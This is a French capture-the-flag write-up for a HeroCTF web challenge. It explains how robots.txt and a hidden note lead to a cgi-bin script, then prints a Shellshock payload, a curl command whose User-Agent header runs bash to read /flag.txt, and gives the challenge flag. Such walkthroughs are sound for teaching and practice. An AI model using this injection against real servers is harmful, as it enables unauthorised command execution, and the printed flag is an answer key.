# C'est choquant

### Catégorie

Web

### Description

Un développeur est en train de faire son site internet.
Il est sur que s'il n'y a aucune entrée utilisateur, il ne peut pas être piraté.
Prouvez lui le contraire en récupérant le fichier /flag.txt!

Accéder au challenge

PS : Le bruteforce reste interdit sur cette épreuve.

Format : Hero{flag}

### Auteur 

Worty

### Solution

Quand on arrive sur la page, le site est vide, sans potentiel entrée utilisateur.<br/>
Un des premiers réflexes et de checker si le fichier "robots.txt" est présent, celui-ci regorge d'information à propos du site internet<br/>
Le contenu de robots.txt est pauvre, il contient néanmoins une information très précieuse, le nom d'un fichier censé resté cacher : th1s1ss3cr3t.txt.<br/>
Ce fichier contient : "Hi Worty, I've put a test file for cgi-bin : wazuuup, check it out!".

En se renseignant un peu, il y avait une faille très connu nommée shellshock, qui utilisait les scripts contenus dans /cgi-bin/.<br/>
Vous trouverez la description complète de la faille ici : https://linuxfr.org/news/une-faille-nommee-shellshock

On va donc passer par ce script "wazuuup" pour exécuter notre code.<br/>
Payload : curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /flag.txt'" http://challs.heroctf.fr:3015/cgi-bin/wazuuup

### Flag

Hero{sh3llsh0ck_1s_c00l_!!}